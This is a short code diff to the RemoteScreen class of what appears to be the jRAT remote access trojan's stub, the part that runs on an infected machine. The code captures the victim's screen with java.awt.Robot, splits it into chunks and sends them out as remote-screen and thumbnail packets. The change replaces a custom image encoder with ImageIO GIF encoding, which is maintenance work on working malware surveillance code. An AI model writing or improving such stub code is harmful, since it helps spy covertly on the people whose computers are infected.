@@ -8,13 +8,15 @@ import java.awt.Rectangle;
 import java.awt.Robot;
 import java.awt.Toolkit;
 import java.awt.image.BufferedImage;
+import java.io.ByteArrayOutputStream;
 import java.io.DataOutputStream;
+
+import javax.imageio.ImageIO;
 
 import pro.jrat.stub.packets.outgoing.AbstractOutgoingPacket;
 import pro.jrat.stub.packets.outgoing.Packet17RemoteScreen;
 import pro.jrat.stub.packets.outgoing.Packet18OneRemoteScreen;
 import pro.jrat.stub.packets.outgoing.Packet33Thumbnail;
-import pro.jrat.stub.utils.ImageUtils;
 
 
 public class RemoteScreen {
@@ -84,7 +86,11 @@ public class RemoteScreen {
 	                gr.drawImage(image, 0, 0, chunkWidth, chunkHeight, chunkWidth * y, chunkHeight * x, chunkWidth * y + chunkWidth, chunkHeight * x + chunkHeight, null);  
 	                gr.dispose();  
 	                
-	                byte[] buffer = ImageUtils.encodeImage(i);
+	                ByteArrayOutputStream baos = new ByteArrayOutputStream();
+	            	ImageIO.write(i, "gif", baos);
+	            	baos.flush();
+	            	byte[] buffer = baos.toByteArray();
+	            	baos.close();
 	                
 	                boolean doit = false;
 	                
